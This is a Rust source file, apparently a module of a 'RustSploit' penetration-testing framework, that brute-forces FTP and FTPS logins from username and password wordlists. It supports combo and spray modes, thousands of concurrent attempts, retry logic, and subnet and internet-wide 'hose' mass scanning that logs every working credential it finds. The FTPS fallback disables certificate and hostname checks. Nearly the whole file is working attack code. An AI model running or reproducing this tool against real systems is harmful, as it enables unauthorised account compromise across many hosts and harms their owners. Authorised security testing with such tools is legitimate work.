use anyhow::{anyhow, Result};
use colored::*;
use suppaftp::tokio::{AsyncFtpStream, AsyncNativeTlsConnector, AsyncNativeTlsFtpStream};
use suppaftp::async_native_tls::TlsConnector;
use std::{
    net::IpAddr,
    time::Duration,
};
use tokio::time::{sleep, timeout};

use crate::utils::{
    cfg_prompt_default, cfg_prompt_port, cfg_prompt_existing_file, cfg_prompt_int_range,
    cfg_prompt_yes_no, cfg_prompt_output_file, load_lines,
};
use crate::modules::creds::utils::{
    BruteforceConfig, LoginResult, SubnetScanConfig,
    generate_combos_mode, parse_combo_mode, load_credential_file,
    run_bruteforce, run_subnet_bruteforce,
    is_subnet_target, is_mass_scan_target, run_mass_scan, MassScanConfig,
};

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "FTP Brute Force".to_string(),
        description: "Brute-force FTP authentication with support for FTPS (TLS), combo mode, concurrent connections, and subnet/mass scanning.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

const DEFAULT_TIMEOUT_SECS: u64 = 10;

/// FTP error classification for retry decisions.
#[derive(Debug, Clone, Copy)]
enum FtpErrorType {
    AuthenticationFailed,
    TlsRequired,
    ConnectionLimitExceeded,
    ConnectionFailed,
    Unknown,
}

impl FtpErrorType {
    fn classify_error(msg: &str) -> Self {
        let msg_lower = msg.to_lowercase();
        if msg.contains("530") || msg_lower.contains("login incorrect")
            || (msg_lower.contains("user") && msg_lower.contains("cannot"))
            || (msg_lower.contains("password") && msg_lower.contains("incorrect"))
        {
            return Self::AuthenticationFailed;
        }
        if msg.contains("550 SSL") || msg_lower.contains("tls required")
            || msg_lower.contains("ssl connection required")
            || msg.contains("220 TLS go first")
            || msg_lower.contains("must use tls")
        {
            return Self::TlsRequired;
        }
        if msg.contains("421") || msg_lower.contains("too many")
            || msg_lower.contains("connection limit")
        {
            return Self::ConnectionLimitExceeded;
        }
        if msg_lower.contains("connection refused")
            || msg_lower.contains("no route to host")
            || msg_lower.contains("network unreachable")
            || msg_lower.contains("connection reset")
        {
            return Self::ConnectionFailed;
        }
        Self::Unknown
    }

    fn is_retryable(self) -> bool {
        matches!(self, Self::ConnectionFailed | Self::Unknown)
    }
}

fn display_banner() {
    crate::mprintln!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    crate::mprintln!("{}", "║   FTP Brute Force Module                                  ║".cyan());
    crate::mprintln!("{}", "║   Supports IPv4/IPv6 & Mass Scanning (Hose Mode)          ║".cyan());
    crate::mprintln!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    crate::mprintln!();
}

/// Format IPv4 or IPv6 addresses with port for display.
fn format_addr(target: &str, port: u16) -> String {
    if target.starts_with('[') && target.contains("]:") {
        target.to_string()
    } else if target.matches(':').count() == 1 && !target.contains('[') {
        target.to_string()
    } else {
        let clean = if target.starts_with('[') && target.ends_with(']') {
            &target[1..target.len() - 1]
        } else {
            target
        };
        if clean.contains(':') {
            format!("[{}]:{}", clean, port)
        } else {
            format!("{}:{}", clean, port)
        }
    }
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();

    // --- Mass Scan Mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());
        crate::mprintln!("{}", "[*] Mode: Mass Scan / Hose".yellow());

        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&usernames_file)?;
        let pass_lines = load_lines(&passwords_file)?;
        if users.is_empty() { return Err(anyhow!("User list empty")); }
        if pass_lines.is_empty() { return Err(anyhow!("Pass list empty")); }
        let users = std::sync::Arc::new(users);
        let pass_lines = std::sync::Arc::new(pass_lines);

        return run_mass_scan(target, MassScanConfig {
            protocol_name: "FTP Bruteforce",
            default_port: 21,
            state_file: "ftp_brute_hose_state.log",
            default_output: "ftp_brute_mass_results.txt",
            default_concurrency: 500,
        }, move |ip: IpAddr, port: u16| {
            let users = users.clone();
            let pass_lines = pass_lines.clone();
            async move {
                if !crate::utils::tcp_port_open(ip, port, Duration::from_secs(3)).await {
                    return None;
                }
                let addr_str = format!("{}:{}", ip, port);
                for user in users.iter() {
                    for pass in pass_lines.iter() {
                        match try_ftp_login(&addr_str, &ip.to_string(), user, pass, false).await {
                            Ok(true) => {
                                let msg = format!("{}:{}:{}:{}", ip, port, user, pass);
                                crate::mprintln!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
                                return Some(format!("{}\n", msg));
                            }
                            Ok(false) => {}
                            Err(e) => {
                                let err = e.to_string().to_lowercase();
                                if err.contains("refused") || err.contains("timeout") || err.contains("reset") {
                                    return None;
                                }
                            }
                        }
                    }
                }
                None
            }
        }).await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());

        let port = cfg_prompt_port("port", "FTP Port", 21).await?;
        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&usernames_file)?;
        let passes = load_lines(&passwords_file)?;
        if users.is_empty() { return Err(anyhow!("User list empty")); }
        if passes.is_empty() { return Err(anyhow!("Pass list empty")); }

        let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000).await? as usize;
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file("output_file", "Output result file", "ftp_subnet_results.txt").await?;

        return run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
            concurrency,
            verbose,
            output_file,
            service_name: "ftp",
            jitter_ms: 0,
            source_module: "creds/generic/ftp_bruteforce",
            skip_tcp_check: false,
        }, move |ip: IpAddr, port: u16, user: String, pass: String| {
            async move {
                let addr = format!("{}:{}", ip, port);
                match try_ftp_login(&addr, &ip.to_string(), &user, &pass, false).await {
                    Ok(true) => LoginResult::Success,
                    Ok(false) => LoginResult::AuthFailed,
                    Err(e) => {
                        let et = FtpErrorType::classify_error(&e.to_string());
                        LoginResult::Error { message: e.to_string(), retryable: et.is_retryable() }
                    }
                }
            }
        }).await;
    }

    // --- Single Target Mode ---
    crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());

    let port = cfg_prompt_port("port", "FTP Port", 21).await?;
    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist file").await?;
    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist file").await?;
    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent tasks", 500, 1, 10000).await? as usize;
    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(cfg_prompt_output_file("output_file", "Output file", "ftp_results.txt").await?)
    } else {
        None
    };
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;

    let users = load_lines(&usernames_file)?;
    if users.is_empty() {
        crate::mprintln!("[!] Username wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    crate::mprintln!("{}", format!("[*] Loaded {} usernames", users.len()).cyan());

    let passes = load_lines(&passwords_file)?;
    if passes.is_empty() {
        crate::mprintln!("[!] Password wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    crate::mprintln!("{}", format!("[*] Loaded {} passwords", passes.len()).cyan());

    let mut combos = generate_combos_mode(&users, &passes, parse_combo_mode(&combo_input));
    if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
        let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
        combos.extend(load_credential_file(&cred_path)?);
    }

    // Capture verbose in the closure for try_ftp_login
    let target_owned = target.to_string();
    let try_login = move |t: String, p: u16, user: String, pass: String| {
        let addr = format_addr(&t, p);
        let verbose_flag = verbose;
        async move {
            match try_ftp_login(&addr, &t, &user, &pass, verbose_flag).await {
                Ok(true) => LoginResult::Success,
                Ok(false) => LoginResult::AuthFailed,
                Err(e) => {
                    let et = FtpErrorType::classify_error(&e.to_string());
                    LoginResult::Error { message: e.to_string(), retryable: et.is_retryable() }
                }
            }
        }
    };

    let delay_ms = cfg_prompt_int_range("delay_ms", "Delay between attempts (ms)", 0, 0, 10000).await? as u64;
    let max_retries = cfg_prompt_int_range("max_retries", "Max retries on error", 3, 0, 10).await? as usize;

    let result = run_bruteforce(&BruteforceConfig {
        target: target_owned,
        port,
        concurrency,
        stop_on_success,
        verbose,
        delay_ms: delay_ms,
        max_retries: max_retries,
        service_name: "ftp",
        jitter_ms: 0,
        source_module: "creds/generic/ftp_bruteforce",
    }, combos, try_login).await?;

    result.print_found();
    if let Some(path) = save_path {
        result.save_to_file(&path)?;
    }

    Ok(())
}

/// Try FTP login with FTPS fallback when TLS is required.
async fn try_ftp_login(addr: &str, target: &str, user: &str, pass: &str, verbose: bool) -> Result<bool> {
    // Attempt plain FTP
    match timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS), AsyncFtpStream::connect(addr)).await {
        Ok(Ok(mut ftp)) => {
            match ftp.login(user, pass).await {
                Ok(_) => {
                    if let Err(e) = ftp.quit().await { crate::meprintln!("[!] FTP quit error: {}", e); }
                    return Ok(true);
                }
                Err(e) => {
                    let msg = e.to_string();
                    match FtpErrorType::classify_error(&msg) {
                        FtpErrorType::AuthenticationFailed => return Ok(false),
                        FtpErrorType::TlsRequired => { if let Err(e) = ftp.quit().await { crate::meprintln!("[!] FTP quit error: {}", e); } }
                        FtpErrorType::ConnectionLimitExceeded => {
                            sleep(Duration::from_secs(1)).await;
                            return Err(anyhow!("Connection limit exceeded (421)"));
                        }
                        _ => return Err(anyhow!("FTP login error: {}", msg)),
                    }
                }
            }
        }
        Ok(Err(e)) => return Err(e.into()),
        Err(_) => return Err(anyhow!("Timeout")),
    }

    // FTPS fallback
    if verbose {
        crate::mprintln!("  [v] {} — trying FTPS (TLS)...", addr);
    }
    let mut ftp_tls = match timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS), AsyncNativeTlsFtpStream::connect(addr)).await {
        Ok(Ok(s)) => s,
        _ => return Err(anyhow!("FTPS Connect failed")),
    };

    let connector = AsyncNativeTlsConnector::from(
        TlsConnector::new()
            .danger_accept_invalid_certs(true)
            .danger_accept_invalid_hostnames(true),
    );

    let domain = target.trim_start_matches('[').split(&[']', ':'][..]).next().unwrap_or(target);

    ftp_tls = match ftp_tls.into_secure(connector, domain).await {
        Ok(s) => s,
        Err(e) => return Err(anyhow!("TLS Upgrade: {}", e)),
    };

    match ftp_tls.login(user, pass).await {
        Ok(_) => {
            if let Err(e) = ftp_tls.quit().await { crate::meprintln!("[!] FTP quit error: {}", e); }
            Ok(true)
        }
        Err(e) => {
            match FtpErrorType::classify_error(&e.to_string()) {
                FtpErrorType::AuthenticationFailed => Ok(false),
                _ => Err(anyhow!("FTPS Error: {}", e)),
            }
        }
    }
}
